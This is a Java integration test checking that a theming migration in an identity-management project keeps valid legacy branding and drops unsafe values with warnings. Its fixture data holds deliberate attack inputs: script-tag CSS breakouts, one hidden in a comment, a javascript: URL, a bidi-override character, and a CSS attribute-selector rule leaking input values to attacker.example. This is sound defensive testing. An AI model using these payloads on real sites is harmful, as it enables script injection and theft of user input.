/*
 * Copyright 2026 HelixIAM contributors
 * SPDX-License-Identifier: Apache-2.0
 */

package io.helixiam;

import io.helixiam.authorization.theme.Theme;
import io.helixiam.authorization.theme.ThemeJson;
import io.helixiam.authorization.theme.migration.V20__Migrate_legacy_branding;
import org.flywaydb.core.Flyway;
import org.junit.jupiter.api.Test;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.testcontainers.containers.PostgreSQLContainer;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;

import java.util.ArrayList;
import java.util.List;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * V19/V20 (spec "Migration" test): legacy realm branding (primaryColor, backgroundColor, logoUrl, welcomeText,
 * customCss) and 1.0 organization branding (logo, primary colour) move into the theme layers; valid legacy custom
 * CSS is kept as the escape hatch, invalid CSS (and any other invalid legacy value) is dropped with a clear log.
 */
@Testcontainers
class FlywayStructuredThemingTest {

    @Container
    @SuppressWarnings("resource")
    static final PostgreSQLContainer<?> POSTGRES = new PostgreSQLContainer<>("postgres:16-alpine");

    @Test
    void legacyBrandingIsCarriedOver_andInvalidCssIsDroppedWithALog() {
        final DriverManagerDataSource ds = new DriverManagerDataSource(POSTGRES.getJdbcUrl(), POSTGRES.getUsername(),
                POSTGRES.getPassword());
        Flyway.configure().dataSource(ds).locations("classpath:db/migration").target("18").load().migrate();
        final JdbcTemplate jdbc = new JdbcTemplate(ds);
        jdbc.update("INSERT INTO tenant (tenant_id, name) VALUES ('good','good'), ('evil','evil'), ('plain','plain'), "
                + "('sneaky','sneaky'), ('selfgrant','selfgrant')");
        jdbc.update("INSERT INTO realm_config (realm_id, display_name, logo_url, primary_color, background_color, "
                + "welcome_text, custom_css) VALUES "
                + "('good','Good','https://cdn.good.example/logo.svg','#1F4D47','#f7f8f6','Welcome back',"
                + "  '.helix-form h1 { letter-spacing: -0.01em } .x { background: url(https://cdn.good.example/bg.png) }'), "
                + "('evil','Evil','javascript:alert(1)','red',NULL,'<b>hi</b>','</style><script>alert(1)</script>'), "
                + "('plain','Plain',NULL,NULL,NULL,NULL,NULL), "
                // Review C1 (a): hidden in a comment. C2: url() on the realm's own logo host, not operator-allowlisted.
                + "('sneaky','Sneaky',NULL,NULL,NULL,E'Hi \\u202Eoops','/* </style><script>alert(1)</script> */'), "
                + "('selfgrant','Self','https://attacker.example/logo.png',NULL,NULL,NULL,"
                + "  'input[value^=a]{background:url(https://attacker.example/a)}')");
        jdbc.update("INSERT INTO organization (org_id, tenant_id, name, logo_url, primary_color) VALUES "
                + "('o-1','good','harbor','https://cdn.harbor.example/l.svg','#1F6F5C'), ('o-2','good','bare',NULL,NULL)");

        final List<String> warnings = new ArrayList<>();
        Flyway.configure().dataSource(ds).locations("classpath:db/migration")
                .javaMigrations(new V20__Migrate_legacy_branding(Set.of("https://cdn.good.example"), warnings::add))
                .load().migrate();

        final Theme good = theme(jdbc, "SELECT theme_json FROM realm_theme WHERE realm_id = 'good'");
        assertThat(good.colors().primary().light()).isEqualTo("#1F4D47");
        assertThat(good.colors().primary().dark()).as("derived at render time").isNull();
        assertThat(good.colors().surface().light()).isEqualTo("#f7f8f6");
        assertThat(good.assets().logoUrl()).isEqualTo("https://cdn.good.example/logo.svg");
        assertThat(good.texts().welcomeText().resolve(null)).isEqualTo("Welcome back");
        assertThat(good.customCss()).as("valid legacy CSS kept (its url() is on an operator-allowlisted origin)")
                .startsWith(".helix-form h1");

        final Theme evil = theme(jdbc, "SELECT theme_json FROM realm_theme WHERE realm_id = 'evil'");
        assertThat(evil.customCss()).as("invalid CSS is never carried over").isNull();
        assertThat(evil.colors()).isNull();
        assertThat(evil.assets()).isNull();
        assertThat(evil.texts()).isNull();
        assertThat(evil.isEmpty()).as("nothing valid survived, so no layer is written").isTrue();
        assertThat(warnings).anySatisfy(w -> assertThat(w).contains("evil").contains("custom CSS").contains("<"));
        assertThat(warnings).anySatisfy(w -> assertThat(w).contains("evil").contains("primaryColor"));
        assertThat(warnings).anySatisfy(w -> assertThat(w).contains("evil").contains("logoUrl"));

        assertThat(jdbc.queryForObject("SELECT count(*) FROM realm_theme WHERE realm_id = 'plain'", Integer.class)).isZero();
        assertThat(jdbc.queryForObject("SELECT count(*) FROM realm_theme WHERE realm_id = 'sneaky'", Integer.class))
                .as("comment-hidden script and a bidi-override text are both dropped").isZero();
        assertThat(warnings).anySatisfy(w -> assertThat(w).contains("sneaky").contains("custom CSS"));
        assertThat(warnings).anySatisfy(w -> assertThat(w).contains("sneaky").contains("welcomeText"));
        final Theme selfGrant = theme(jdbc, "SELECT theme_json FROM realm_theme WHERE realm_id = 'selfgrant'");
        assertThat(selfGrant.assets().logoUrl()).isEqualTo("https://attacker.example/logo.png");
        assertThat(selfGrant.customCss()).as("a logo host never allowlists CSS url()").isNull();
        assertThat(jdbc.queryForObject("SELECT count(*) FROM realm_config WHERE logo_url IS NOT NULL OR primary_color IS NOT NULL "
                + "OR background_color IS NOT NULL OR welcome_text IS NOT NULL OR custom_css IS NOT NULL", Integer.class))
                .as("the legacy columns are emptied once moved").isZero();

        final Theme harbor = theme(jdbc, "SELECT theme_json FROM organization_theme WHERE org_id = 'o-1'");
        assertThat(harbor.assets().logoUrl()).isEqualTo("https://cdn.harbor.example/l.svg");
        assertThat(harbor.colors().primary().light()).isEqualTo("#1F6F5C");
        assertThat(jdbc.queryForObject("SELECT realm_id FROM organization_theme WHERE org_id = 'o-1'", String.class))
                .isEqualTo("good");
        assertThat(jdbc.queryForObject("SELECT count(*) FROM organization_theme WHERE org_id = 'o-2'", Integer.class)).isZero();

        // Deleting an organization or a realm removes its theme.
        jdbc.update("DELETE FROM organization WHERE org_id = 'o-1'");
        assertThat(jdbc.queryForObject("SELECT count(*) FROM organization_theme", Integer.class)).isZero();
        jdbc.update("DELETE FROM realm_config WHERE realm_id = 'evil'");
        assertThat(jdbc.queryForObject("SELECT count(*) FROM realm_theme WHERE realm_id = 'evil'", Integer.class)).isZero();
    }

    private static Theme theme(final JdbcTemplate jdbc, final String sql) {
        return ThemeJson.read(jdbc.queryForList(sql, String.class).stream().findFirst().orElse(null));
    }
}
